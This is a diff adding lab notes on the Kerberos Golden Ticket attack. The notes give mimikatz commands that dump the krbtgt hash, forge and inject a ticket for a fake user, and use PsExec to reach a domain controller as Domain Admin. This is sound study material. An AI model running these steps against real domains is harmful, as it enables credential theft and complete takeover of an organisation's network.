@@ -1,0 +1,28 @@
+GOLDEN TICKETS
+
+DOMAIN CONTROL SYNCHRONIZATION
+-KDC encrypts TGT with its secret key. This secret key is password hash of a domain user account called krbtgt.
+-If we can obtain krbtgt password hash, we can create self-made TGT, also known as golden tickets.
+
+Test
+Move laterally from Win10 to DC via PsExec as a regular user.
+> psexec.exe \\dc.hacker.testlab cmd.exe
+Access Denied
+
+Go to DC as admin user and cd to C:
+mimikatz# privilege::debug
+mimikatz# lsadump::lsa /patch
+
+// delete existing tickets
+mimikatz# kerberos::purge
+// obtain SID
+> whoami /user
+mimikatz# kerberos::golden /user:fakeuser /domain:hacker.testlab /sid:<> /krbtgt:<> /ptt
+
+Once golden ticket is injected into memory
+mimikatz# misc::cmd
+> psexec.exe \\dc.hacker cmd.exe
+> whoami 
+fake user
+> whoami /groups
+Domain Admins
